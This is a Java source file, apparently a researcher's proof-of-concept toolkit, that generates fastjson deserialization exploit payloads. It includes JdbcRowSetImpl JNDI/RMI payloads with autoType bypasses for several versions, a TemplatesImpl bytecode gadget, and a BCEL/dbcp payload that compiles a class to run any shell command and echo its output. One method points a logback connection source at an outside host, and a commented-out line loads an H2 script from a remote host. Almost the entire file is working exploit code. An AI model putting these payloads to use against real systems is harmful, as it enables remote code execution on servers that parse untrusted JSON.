package com.venscor;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.venscor.dbcp.JavaStringCompiler;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Map;

/**
 * @ClassName PoC
 * @Description TODO
 * @Author venscor
 * @Create Time 2019-07-11 22:37
 * @Version 1.0
 */
public class PoC {

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload 1.2.25以下的poc
     * @Date 14:13 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload24() {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayloadNew 1.2.47以下bypass的poc
     * @Date 14:13 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload47() {
        String payload = "{\"fuck\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"fuck\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost/RemoteBean\",\"autoCommit\":true}}\n";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload41 1.2.41 绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:33 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload41() {
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload42 1.2.42 绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:33 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload42() {
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload43 1.2.43绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:54 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload43() {
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload45 1.2.45绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:54 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload45() {
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/RemoteBean\"}}";
        return payload;
    }


    /*
     * @Author venscor
     * @Description  blackListAddress 安全研究人员对类blacklist的研究
     * @Date 14:35 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String blackListAddress() {
        String url = "https://github.com/LeadroyaL/fastjson-blacklist";
        return url;
    }


    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static String templatesImplPayload() {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test.class";
        String evilCode = readClass(evilClassPath);
        System.out.println(evilCode);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\"" + evilCode + "\"]," +
                "'_name':'a.b'," +
                "'_tfactory':{ }," +
                "\"_outputProperties\":{ }}\n";
//        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        return payload;
    }


    /*
     * @Author wangyu89
     * @Description   基于dbcp的回显的payload
     * @Date 16:55 2019-07-12
     * @Param
     * @return
     **/
    public static String[] bcelPayload(String cmd) {
        String payload1 = "{\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"$$BCEL$$%s\"}";
        String payload2 = "{\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"$$BCEL$$%s\"}";
        String exp =
                "import java.io.*;\n" +
                        "\n" +
                        "public class Exp {\n" +
                        "\n" +
                        "    public static String exec(String cmd){\n" +
                        "        String[] shell  = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")? new String[]{\"cmd.exe\",\"/c\",cmd}:new String[]{\"/bin/bash\",\"-c\",cmd};\n" +
                        "        String s = \"\";\n" +
                        "        try {\n" +
                        "            Process p = Runtime.getRuntime().exec(shell);\n" +
                        "            InputStream is = p.getInputStream();\n" +
                        "            BufferedInputStream bis = new BufferedInputStream(is);\n" +
                        "            int len;\n" +
                        "            int bufferSize = 1024*4;\n" +
                        "            byte[] buffer = new byte[bufferSize];\n" +
                        "            while((len=bis.read(buffer,0,bufferSize))!=-1){\n" +
                        "                s+=new String(buffer,0,len);\n" +
                        "            }\n" +
                        "            is.close();\n" +
                        "            bis.close();\n" + "" +
                        "            BufferedInputStream eis = new BufferedInputStream(p.getErrorStream());\n" +
                        "            while((len=eis.read(buffer,0,bufferSize))!=-1){\n" +
                        "                s+=new String(buffer,0,len);\n" +
                        "            }\n" +
                        "            eis.close();" +
                        "        } catch (IOException e) {\n" +
                        "        }finally {\n" +
                        "            throw  new RuntimeException(\"**************************\"+s);\n" +
                        "        }\n" +
                        "    }\n" +
                        "\n" +
                        "    static{\n" +
                        "        exec(\"%s\");\n" +
                        "    }\n" +
                        "}\n";
        JavaStringCompiler compiler = new JavaStringCompiler();
        try {
            Map<String, byte[]> map = compiler.compile("Exp.java", String.format(exp, cmd));
            String expBin = Utility.encode(map.get("Exp"), true);
            String payloadJSON1 = String.format(payload1, expBin);
            String payloadJSON2 = String.format(payload2, expBin);
            return new String[]{payloadJSON1, payloadJSON2};
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new String[]{};
    }

    public static String payload58() {
//        String payload = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\": \"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://1234567.codesec.woshiyingxiong.com'\"}";
        String payload1 = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\": \"jdbc:mysql://12345xxx67890.codesec.woshiyingxiong.com:8000\"}";

        return payload1;
    }


}
